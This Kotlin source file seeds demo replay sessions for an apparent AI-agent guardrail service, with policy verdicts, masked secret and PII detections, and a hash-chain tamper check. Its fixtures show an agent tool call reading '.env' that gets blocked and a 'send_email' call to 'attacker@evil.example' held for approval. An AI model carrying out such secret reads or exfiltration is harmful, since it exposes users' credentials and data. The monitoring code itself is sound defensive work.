package kr.guardmcp.controlplane.domain

import org.springframework.stereotype.Component
import java.security.MessageDigest
import java.time.Instant
import java.util.UUID

/**
 * In-memory Replay data source (GMCP-28). Nodes are pre-assembled and stored as first-class
 * records at seed time, rather than derived per-request from a raw event log: `GET /events/{id}`,
 * deep-link anchoring, and the `ts`/`eventId` tie-break all need a stable per-node identity, and
 * the hash chain must be computed once, deterministically, over the exact payload it later
 * verifies against.
 */
@Component
class ReplayStore {
    private val sessions = linkedMapOf<UUID, ReplaySession>()
    private val nodesBySession = linkedMapOf<UUID, List<TimelineNode>>()
    private val nodeIndex = linkedMapOf<UUID, Pair<UUID, TimelineNode>>()
    private val chainResults = linkedMapOf<UUID, ChainResult>()

    init {
        seedInjectionSession()
        seedPiiSession()
        seedBrokenChainSession()
        seedLargeSession()
    }

    fun session(id: UUID): ReplaySession? = sessions[id]

    /** Sessions matching [q] (session id or any node's toolName, case-insensitive) and [isLive], newest first. */
    fun sessions(q: String?, isLive: Boolean?): List<ReplaySession> =
        sessions.values
            .filter { isLive == null || it.isLive == isLive }
            .filter { session -> q == null || matchesQuery(session.id, q) }
            .sortedByDescending { it.startedAt }

    /** `ts` ascending, `eventId` as the tie-break. Null means the session does not exist. */
    fun timeline(sessionId: UUID): List<TimelineNode>? = nodesBySession[sessionId]

    fun node(eventId: UUID): Pair<UUID, TimelineNode>? = nodeIndex[eventId]

    fun chainResult(sessionId: UUID): ChainResult = chainResults.getValue(sessionId)

    fun eventCount(sessionId: UUID): Int = nodesBySession[sessionId]?.size ?: 0

    fun verdictSummary(sessionId: UUID): Map<String, Int> {
        val counts = nodesBySession[sessionId].orEmpty()
            .mapNotNull { it.verdict }
            .groupingBy { it.wire }
            .eachCount()
        return linkedMapOf(
            "allow" to (counts["allow"] ?: 0),
            "warn" to (counts["warn"] ?: 0),
            "require_approval" to (counts["require_approval"] ?: 0),
            "block" to (counts["block"] ?: 0),
        )
    }

    private fun matchesQuery(sessionId: UUID, q: String): Boolean {
        if (sessionId.toString().contains(q, ignoreCase = true)) return true
        return nodesBySession[sessionId].orEmpty().any { it.toolName?.contains(q, ignoreCase = true) == true }
    }

    // ---- seeding ------------------------------------------------------------------------

    private var nodeSeq = 0L

    /** Deterministic, monotonically sortable ids so seed data (and its hash chain) is reproducible. */
    private fun nextEventId(): UUID = UUID.fromString("e0000000-0000-4000-8000-%012d".format(++nodeSeq))

    private fun register(sessionId: UUID, nodes: List<TimelineNode>) {
        val sorted = nodes.sortedWith(compareBy({ it.ts }, { it.eventId.toString() }))
        nodesBySession[sessionId] = sorted
        chainResults[sessionId] = validateChain(sorted)
        sorted.forEach { nodeIndex[it.eventId] = sessionId to it }
    }

    /** T-01-style scenario: matches the worked example in the GMCP-28 spec almost verbatim. */
    private fun seedInjectionSession() {
        val sessionId = DemoSeed.SESSION_INJECTION_ID
        val start = DemoSeed.SEEDED_AT
        sessions[sessionId] = ReplaySession(sessionId, "claude-code-cli", start, endedAt = null, isLive = true)

        val chain = ChainBuilder()
        register(
            sessionId,
            listOf(
                TimelineNode(nextEventId(), TimelineNodeType.USER_INPUT, start, "README 요약"),
                // Same `ts` as the user-input node above: seeds the ts-tie/eventId tie-break case.
                TimelineNode(nextEventId(), TimelineNodeType.AGENT_STEP, start, "파일 읽기 결정"),
                TimelineNode(
                    nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(590),
                    "read_file(\".env\")", toolName = "read_file", direction = ToolCallDirection.REQ,
                    argsDigest = "sha256:" + sha256("read_file:.env"),
                ),
                chain.verdictNode(
                    eventId = nextEventId(), ts = start.plusMillis(628), summary = "차단",
                    verdict = Verdict.BLOCK, riskScore = 92,
                    matchedPolicyIds = listOf("pol-env-read-block"),
                    detections = listOf(
                        Detection("SECRET", "AWS_ACCESS_KEY", Span(128, 148), 0.97, "AKIA****************"),
                        Detection("SECRET", "GENERIC_API_KEY", Span(210, 244), 0.88, "sk-****************"),
                    ),
                ),
                TimelineNode(nextEventId(), TimelineNodeType.RESULT, start.plusMillis(639), "error 반환"),
            ),
        )
    }

    /** T-02-style scenario: a low-risk PII hit that is masked and warned about, not blocked. */
    private fun seedPiiSession() {
        val sessionId = DemoSeed.SESSION_PII_ID
        val start = DemoSeed.SEEDED_AT.plusSeconds(60)
        sessions[sessionId] = ReplaySession(sessionId, "claude-code-cli", start, start.plusSeconds(4), isLive = false)

        val chain = ChainBuilder()
        register(
            sessionId,
            listOf(
                TimelineNode(nextEventId(), TimelineNodeType.USER_INPUT, start, "고객 010-1234-5678 명단 조회"),
                TimelineNode(nextEventId(), TimelineNodeType.AGENT_STEP, start.plusMillis(90), "고객 조회 도구 선택"),
                TimelineNode(
                    nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(150),
                    "lookup_customer(\"홍길동\")", toolName = "lookup_customer", direction = ToolCallDirection.REQ,
                    argsDigest = "sha256:" + sha256("lookup_customer:홍길동"),
                ),
                chain.verdictNode(
                    eventId = nextEventId(), ts = start.plusMillis(190), summary = "경고 · 마스킹 후 통과",
                    verdict = Verdict.WARN, riskScore = 45,
                    matchedPolicyIds = listOf("pol-mask-korean-phone"),
                    detections = listOf(Detection("PII", "PHONE_KR", Span(3, 16), 0.91, "010-****-5678")),
                ),
                TimelineNode(nextEventId(), TimelineNodeType.RESULT, start.plusMillis(210), "마스킹된 결과 반환"),
            ),
        )
    }

    /** Two verdict rounds; the second has its stored hash tampered so [validateChain] reports BROKEN. */
    private fun seedBrokenChainSession() {
        val sessionId = DemoSeed.SESSION_BROKEN_CHAIN_ID
        val start = DemoSeed.SEEDED_AT.plusSeconds(120)
        sessions[sessionId] = ReplaySession(sessionId, "claude-code-cli", start, start.plusSeconds(5), isLive = false)

        val chain = ChainBuilder()
        register(
            sessionId,
            listOf(
                TimelineNode(nextEventId(), TimelineNodeType.USER_INPUT, start, "디렉터리 목록 조회"),
                TimelineNode(
                    nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(100),
                    "list_dir(\"/workspace\")", toolName = "list_dir", direction = ToolCallDirection.REQ,
                    argsDigest = "sha256:" + sha256("list_dir:/workspace"),
                ),
                chain.verdictNode(
                    eventId = nextEventId(), ts = start.plusMillis(140), summary = "허용",
                    verdict = Verdict.ALLOW, riskScore = 10,
                    matchedPolicyIds = listOf("pol-default-allow"), detections = emptyList(),
                ),
                TimelineNode(nextEventId(), TimelineNodeType.RESULT, start.plusMillis(150), "결과 반환"),
                TimelineNode(nextEventId(), TimelineNodeType.AGENT_STEP, start.plusMillis(200), "외부 전송 시도 판단"),
                TimelineNode(
                    nextEventId(), TimelineNodeType.TOOL_CALL, start.plusMillis(240),
                    "send_email(\"attacker@evil.example\")", toolName = "send_email", direction = ToolCallDirection.REQ,
                    argsDigest = "sha256:" + sha256("send_email:attacker"),
                ),
                chain.verdictNode(
                    eventId = nextEventId(), ts = start.plusMillis(280), summary = "승인 대기",
                    verdict = Verdict.REQUIRE_APPROVAL, riskScore = 70,
                    matchedPolicyIds = listOf("pol-external-email-approval"), detections = emptyList(),
                    corrupt = true,
                ),
                TimelineNode(nextEventId(), TimelineNodeType.RESULT, start.plusMillis(290), "보류됨"),
            ),
        )
    }

    /** 1200-node session so pagination round-trips exercise more than one page at the max limit. */
    private fun seedLargeSession() {
        val sessionId = DemoSeed.SESSION_LARGE_ID
        val start = DemoSeed.SEEDED_AT.plusSeconds(3600)
        sessions[sessionId] = ReplaySession(sessionId, "claude-code-cli", start, endedAt = null, isLive = true)

        val chain = ChainBuilder()
        val nodes = mutableListOf<TimelineNode>()
        var ts = start
        repeat(LARGE_SESSION_ROUNDS) { round ->
            nodes += TimelineNode(nextEventId(), TimelineNodeType.USER_INPUT, ts, "batch step $round 요청")
            ts = ts.plusMillis(10)
            nodes += TimelineNode(nextEventId(), TimelineNodeType.AGENT_STEP, ts, "batch step $round 판단")
            ts = ts.plusMillis(10)
            nodes += TimelineNode(
                nextEventId(), TimelineNodeType.TOOL_CALL, ts, "large_scan_tool(#$round)",
                toolName = "large_scan_tool", direction = ToolCallDirection.REQ,
                argsDigest = "sha256:" + sha256("large_scan_tool:$round"),
            )
            ts = ts.plusMillis(10)
            nodes += chain.verdictNode(
                eventId = nextEventId(), ts = ts, summary = "허용",
                verdict = Verdict.ALLOW, riskScore = 5,
                matchedPolicyIds = emptyList(), detections = emptyList(),
            )
            ts = ts.plusMillis(10)
            nodes += TimelineNode(nextEventId(), TimelineNodeType.RESULT, ts, "ok 반환")
            ts = ts.plusMillis(10)
        }
        register(sessionId, nodes)
    }

    /** Recomputes and checks the hash chain independently of however the nodes were built. */
    private fun validateChain(nodes: List<TimelineNode>): ChainResult {
        var expectedPrevHash = GENESIS_HASH
        for (node in nodes) {
            if (node.type != TimelineNodeType.VERDICT) continue
            val detail = requireNotNull(node.detail) { "VERDICT node ${node.eventId} is missing its detail" }
            if (detail.prevHash != expectedPrevHash) return ChainResult(ChainStatus.BROKEN, node.eventId)
            val recomputed = sha256(
                chainPayload(
                    node.eventId,
                    requireNotNull(node.verdict),
                    requireNotNull(node.riskScore),
                    detail.matchedPolicyIds,
                    detail.detections,
                    detail.maskDiffRef,
                    expectedPrevHash,
                ),
            )
            if (recomputed != detail.hash) return ChainResult(ChainStatus.BROKEN, node.eventId)
            expectedPrevHash = detail.hash
        }
        return ChainResult(ChainStatus.VALID, null)
    }

    /** Builds VERDICT nodes for one session, chaining each `hash` to the previous verdict's. */
    private inner class ChainBuilder {
        private var prevHash = GENESIS_HASH

        fun verdictNode(
            eventId: UUID,
            ts: Instant,
            summary: String,
            verdict: Verdict,
            riskScore: Int,
            matchedPolicyIds: List<String>,
            detections: List<Detection>,
            corrupt: Boolean = false,
        ): TimelineNode {
            val maskDiffRef = "/api/v1/events/$eventId/mask-diff"
            val correctHash = sha256(
                chainPayload(eventId, verdict, riskScore, matchedPolicyIds, detections, maskDiffRef, prevHash),
            )
            val storedHash = if (corrupt) "0" + correctHash.drop(1) else correctHash
            val detail = VerdictDetail(matchedPolicyIds, detections, maskDiffRef, storedHash, prevHash)
            prevHash = correctHash
            return TimelineNode(eventId, TimelineNodeType.VERDICT, ts, summary, verdict = verdict, riskScore = riskScore, detail = detail)
        }
    }

    companion object {
        private const val GENESIS_HASH = ""
        private const val LARGE_SESSION_ROUNDS = 240

        private fun chainPayload(
            eventId: UUID,
            verdict: Verdict,
            riskScore: Int,
            matchedPolicyIds: List<String>,
            detections: List<Detection>,
            maskDiffRef: String,
            prevHash: String,
        ): String {
            val detectionsPart = detections.joinToString(";") {
                "${it.type}:${it.subtype}:${it.span.start}-${it.span.end}:${it.confidence}:${it.maskedAs}"
            }
            return "$prevHash|$eventId|${verdict.wire}|$riskScore|${matchedPolicyIds.joinToString(",")}|$maskDiffRef|$detectionsPart"
        }

        private fun sha256(input: String): String {
            val bytes = MessageDigest.getInstance("SHA-256").digest(input.toByteArray(Charsets.UTF_8))
            return bytes.joinToString("") { "%02x".format(it) }
        }
    }
}
